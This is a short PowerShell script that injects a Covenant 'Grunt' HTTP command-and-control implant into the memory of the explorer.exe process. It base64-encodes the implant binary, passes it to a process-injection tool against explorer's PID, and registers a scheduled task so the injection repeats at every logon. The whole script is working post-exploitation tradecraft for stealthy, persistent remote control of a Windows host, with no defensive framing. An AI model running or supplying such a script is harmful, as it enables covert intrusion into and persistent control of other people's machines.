# Get PID of first occurence of explorer.exe
$procid=(get-process explorer).id | Select-Object -First 1

# Create .txt payload
$filename = "C:\Users\Administrator\Downloads\GruntHTTP.bin"
[Convert]::ToBase64String([IO.File]::ReadAllBytes($filename)) | Out-File C:\Users\Downloads\covenant.txt

# Inject Payload into Memory
C:\Users\Administrator\ProcessInjection\ProcessInjection\bin\Debug\ProcessInjection.exe /pid:$procid /path:C:\Users\Administrator\Downloads\covenant.txt /f:base64 /t:1

# Ensure this script runs on boot with a scheduled task. Note system32 is where this script is located
schtasks /create /tn "MyCustomTask" /sc onlogon /tr "start /B C:\Windows\System32\InjectPayloadtoMemoryOnboot.ps1"
